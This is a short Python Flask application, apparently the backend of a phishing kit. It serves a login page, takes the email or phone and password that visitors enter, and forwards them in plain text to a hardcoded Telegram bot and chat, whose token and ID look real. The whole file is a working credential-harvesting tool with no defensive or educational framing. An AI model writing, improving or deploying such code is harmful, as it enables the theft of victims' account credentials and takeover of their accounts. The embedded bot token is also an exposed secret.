import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# Replace with your real Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = "7983942451:AAGQ4n_zseITBRgO05IB9zht8gcSFHoHNnM"  # Replace with your bot token
TELEGRAM_CHAT_ID = "6989457077"      # Replace with your chat ID

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["GET", "POST"])  # Allow both GET and POST
def login():
    if request.method == "POST":
        email_or_phone = request.form["email_or_phone"]
        password = request.form["password"]

        # Send login details to Telegram
        message = f"New Login Attempt\n📧 User: {email_or_phone}\n🔑 Password: {password}"
        response = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={message}")

        print("Telegram Response:", response.json())  # Debugging info

        return "Login details sent to your Telegram!"
    else:
        return "Invalid request method.", 405  # Show error if method is not POST

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

